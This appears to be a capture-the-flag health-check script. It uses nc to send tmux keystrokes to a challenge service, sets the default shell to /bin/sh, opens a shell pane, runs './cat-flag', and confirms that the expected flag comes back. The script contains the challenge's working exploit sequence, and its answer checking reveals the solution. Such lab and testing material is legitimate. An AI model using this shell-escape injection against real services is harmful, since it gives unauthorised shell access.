#/bin/bash

# Honor HOST/PORT from the environment (set by `pwnmake check`); fall back
# to positional args, then sensible defaults, so manual runs still work.
HOST="${HOST:-localhost}"
PORT="${PORT:-25002}"
SLEEP_TIME="${SLEEP_TIME:-0.1}"
OUTPUT_FILE="${OUTPUT_FILE:-/dev/null}"

if [ $# -eq 0 ]; then
    echo "Usage: $0 [host=localhost] [port=25002] [sleep_time_s=0.1] [output=/dev/null (1 for stdout)]"
    echo "Example: $0 localhost 25002 0.1 1"
fi
if [ $# -ge 1 ]; then
    HOST=$1
fi
if [ $# -ge 2 ]; then
    PORT=$2
fi
if [ $# -ge 3 ]; then
    SLEEP_TIME=$3
fi
if [ $# -ge 4 ]; then
    OUTPUT_FILE=$4
fi

echo "using $HOST as the host"
echo "using $PORT as the port"
echo "using ${SLEEP_TIME}s sleeps between requests"
echo "outputting live state to ${OUTPUT_FILE}"

out_file=$(mktemp)

{
    # go to tmux configuration
    sleep "$SLEEP_TIME"; printf '\x02'; sleep "$SLEEP_TIME"; printf ':';
    sleep "$SLEEP_TIME";
    # use mark 'a' as the mark
    printf 'set -g default-shell /bin/sh\r';
    sleep "$SLEEP_TIME";
    # spawn a second shell in tmux
    sleep "$SLEEP_TIME"; printf '\x02'; sleep "$SLEEP_TIME"; printf '"';
    # cat the flag
    printf './cat-flag\r';
    sleep "$SLEEP_TIME";
    # exit out gracefully from the sub-shell
    printf 'exit\r';
    # identify as a hacker (hacking with style)
    printf '\t'; sleep "$SLEEP_TIME"; printf '\t'; sleep "$SLEEP_TIME"; printf '\r'; sleep "$SLEEP_TIME"
    # exit
    printf '\r';
    sleep "$SLEEP_TIME"
    printf 'e\r';
    sleep "$SLEEP_TIME"
    printf '\r';
} | nc "$HOST" "$PORT" | tee "${out_file}" >&$OUTPUT_FILE

EXPECTED=$(cat flag.txt)

if grep -q -e "$EXPECTED" "${out_file}"; then
    echo "✅ Challenge still up as of $(date). Flag is still ${EXPECTED}"
    rm -f "${out_file}"
    exit 0
else
    echo "❌ Challenge down as of $(date)! Output in ${out_file}."
    exit 1
fi